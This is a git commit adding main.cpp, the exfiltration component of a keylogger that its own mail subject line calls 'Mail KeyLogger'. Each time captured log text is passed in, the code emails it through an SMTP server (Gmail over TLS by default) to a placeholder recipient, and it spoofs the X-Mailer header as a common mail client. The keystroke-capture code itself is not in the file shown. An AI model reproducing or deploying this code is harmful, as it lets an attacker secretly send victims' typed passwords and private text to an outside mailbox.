611df9d579549c4f7ff500c97d095d3fe3ec1936
AmanPareekAp <50173709+AmanPareekAp@users.noreply.github.com>
2019-05-02 11:14:11 +0530

    Add files via upload

---
+++ main.cpp
@@ -0,0 +1,75 @@
+#include "CSmtp.h"
+#include <iostream>
+#include "myheader.h"
+#include<string>
+
+char* strr;
+
+void createMail::setLogText(char* s){
+	cout << "setLogText called";
+	strr = s;
+	sendEmail();
+}
+
+int createMail::sendEmail()
+{
+	cout << endl << "Email Called" << endl ;
+	bool bError = false;
+
+	try
+	{
+		CSmtp mail;
+
+#define test_gmail_tls
+
+#if defined(test_gmail_tls)
+		mail.SetSMTPServer("smtp.gmail.com",587);
+		mail.SetSecurityType(USE_TLS);
+#elif defined(test_gmail_ssl)
+		mail.SetSMTPServer("smtp.gmail.com",465);
+		mail.SetSecurityType(USE_SSL);
+#elif defined(test_hotmail_TLS)
+		mail.SetSMTPServer("smtp.live.com",25);
+		mail.SetSecurityType(USE_TLS);
+#elif defined(test_aol_tls)
+		mail.SetSMTPServer("smtp.aol.com",587);
+		mail.SetSecurityType(USE_TLS);
+#elif defined(test_yahoo_ssl)
+		mail.SetSMTPServer("plus.smtp.mail.yahoo.com",465);
+		mail.SetSecurityType(USE_SSL);
+#endif
+
+		mail.SetLogin("Enter sender email here");
+		mail.SetPassword("Enter password here");
+  		mail.SetSenderName("User");
+  		mail.SetSenderMail("Enter sender email here");
+  	    mail.SetReplyTo("Enter sender email here");
+  		mail.SetSubject("Mail KeyLogger");
+  		//mail.AddRecipient("enter email here");
+		mail.AddRecipient("enter recipient email here");
+  		mail.SetXPriority(XPRIORITY_NORMAL);
+  		mail.SetXMailer("The Bat! (v3.02) Professional");
+  		mail.AddMsgLine(strr);
+		//mail.AddMsgLine("");
+		//mail.AddMsgLine("...");
+		//mail.AddMsgLine("How are you today?");
+		//mail.AddMsgLine("");
+		//mail.AddMsgLine("Regards");
+		//mail.ModMsgLine(5,"regards");
+		//mail.DelMsgLine(2);
+		//mail.AddMsgLine("User");
+
+  		//mail.AddAttachment("../test1.jpg");
+  		//mail.AddAttachment("c:\\test2.exe");
+		//mail.AddAttachment("c:\\test3.txt");
+		mail.Send();
+	}
+	catch(ECSmtp e)
+	{
+		std::cout << "Error: " << e.GetErrorText().c_str() << ".\n";
+		bError = true;
+	}
+	if(!bError)
+		std::cout << "Mail was send successfully.\n";
+	return 0;
+}
